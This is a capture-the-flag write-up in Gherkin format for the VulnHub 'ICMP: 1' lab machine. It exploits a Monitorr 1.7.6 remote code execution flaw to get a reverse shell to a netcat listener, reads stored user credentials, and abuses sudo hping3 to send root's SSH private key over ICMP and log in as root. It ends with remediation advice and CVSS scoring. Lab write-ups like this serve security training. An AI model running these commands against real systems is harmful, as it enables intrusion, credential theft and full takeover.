## Version 1.4.1
## language: en

Feature:
  TOE:
    vulnhub ICMP: 1
  Location:
    https://192.168.1.98/
  CWE:
    CWE-094: https://cwe.mitre.org/data/definitions/094.html
  Rule:
    REQ.004: https://docs.fluidattacks.com/criteria/vulnerabilities/004
    REQ.014: https://docs.fluidattacks.com/criteria/vulnerabilities/014
    REQ.020: https://docs.fluidattacks.com/criteria/vulnerabilities/020
    REQ.385: https://docs.fluidattacks.com/criteria/vulnerabilities/385
  Goal:
    Get root privileges and the root flag
  Recommendation:
    Upgrade tools such as "Monitorr" and don't save confidential information

  Background:

  Hacker's software:
    | <Software name> | <Version>    |
    | Kali linux      | 5.10.28      |
    | Virtualbox      | 6.1.34       |
    | Firefox         | 91.9.0       |
    | Nmap            | 7.92         |
    | arp-scan        | 1.9.7        |
    | searchsploit    | 3.8.8        |
    | Python          | 3.10.4       |
  TOE information:
    Given a .ova file
    Then I ran the file in Virtualbox
    Then I could see the virtual machine was running [evidence](01.png)
    And the server is running SSH version OpenSSH 7.9p1
    And HTTP version Apache httpd 2.4.38

  Scenario: Normal use case
    Given access to a virtual server
    And a mac address [evidence](02.png)
    Then I execute the following commands:
    """
    $ nmap -sP 192.168.1.0/24 | sudo arp-scan -l | grep 08
    """
    When looking at the result [evidence](03.png)
    Then I decided to visit the website:
    """
    http://192.168.1.98/
    """
    When looking in the browser
    Then I could see a web tool [evidence](04.png)

  Scenario: Dynamic detection
    Given an IPv4 address 192.168.1.98
    Then I ran a scan report
    And I execute the following command:
    """
    $ nmap -p- -sV -sC 192.168.1.98
    """
    Then I could see services and which ports are open [evidence](05.png)
    And I decided to explore the different ports
    Then I noted that port 22 was used by SSH
    And its version OpenSSH 7.9p1
    Then I noted that port 80 was used by HTTP
    And its version Apache httpd 2.4.38
    When looking in the browser while visiting the next website:
    """
    http://192.168.1.98
    """
    Then I could see a web tool and a version from that tool [evidence](06.png)
    When looking for a "Monitorr 1.7.6" vulnerability
    Then I ran the following command
    """
    $ searchsploit monitorr 1.7.6
    """
    When I checked, it was an arbitrary file upload
    And an authenticated remote code execution attack [evidence](07.png)
    Then I could conclude that I can use Python3
    And exploit the "Monitorr 1.7.6" vulnerability

  Scenario: Exploitation
    Given the website http://192.168.1.98
    And the "Monitorr 1.7.6" vulnerability
    Then I could execute the exploit file using Python3
    When I saw the code options [evidence](08.png)
    Then I execute the following command:
    """
    $ python3 48980.py http://192.168.1.98/mon
    192.168.1.106 9001
    """
    And the next one:
    """
    $ nc -lvnp 9001
    """
    Then I got a positive response [evidence](09.png)
    When looking for system information
    Then I got a username called "fox"
    And a file with confidential information [evidence](10.png)
    Then I execute the following command:
    """
    $ find / -type f -name crypt.php 2>/dev/null
    """
    Then I got nothing [evidence](11.png)
    Then the file must be into an only read directory
    Then I execute the following command:
    """
    $ cat devel/crypt.php
    """
    When I checked it was the fox user credential
    Then I log in with the given credentials using two different terminals
    Then I run the following command: [evidence](12.png)
    """
    $ sudo -l
    """
    Then I could see the sudo commands that I can run
    Then these commands only work through ICMP
    When I got the private key to root into the "id_rsa" file [evidence](13.png)
    And when I got information about the command
    And how to use it [evidence](14.png)
    Then I run the following command: [evidence](15.png)
    """
    $ sudo /usr/sbin/hping3 --icmp 127.0.0.1 --sign signature
    --file /root/.ssh/id_rsa -d 100 --safe
    """
    Then I run the following command in the other terminal: [evidence](16.png)
    """
    $ sudo /usr/sbin/hping3 --icmp 127.0.0.1 --listen signature --safe
    """
    Then I got the root private key into a file called "private_key"
    Then I gave the correct permissions to the file
    And I execute the following commands:
    """
    $ chmod u+rwx private_key
    $ ssh root@192.168.1.98 -i private_key
    """
    Then I got a positive response [evidence](18.png)
    Then I become the root user
    And I got the flag [evidence](19.png)

  Scenario: Remediation
    Given that the system has a vulnerability
    Then is necessary to upgrade the "Monitorr" tool
    And is necessary to avoid saving confidential info in files
    Then I can confirm that the server is less vulnerable

  Scenario: Scoring
  Severity scoring according to CVSSv3 standard
  Base: Attributes that are constants over time and organizations
    7.5/10 (High) - AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N/
  Temporal: Attributes that measure the exploit's popularity and fixability
    6.5/10 (Medium) - E:P/RL:O/RC:R
  Environmental: Unique and relevant attributes to a specific user environment
    6.5/10 (Medium) - CR:M/IR:M/AR:M

  Scenario: Correlations
    No correlations have been found to this date 2022-09-11
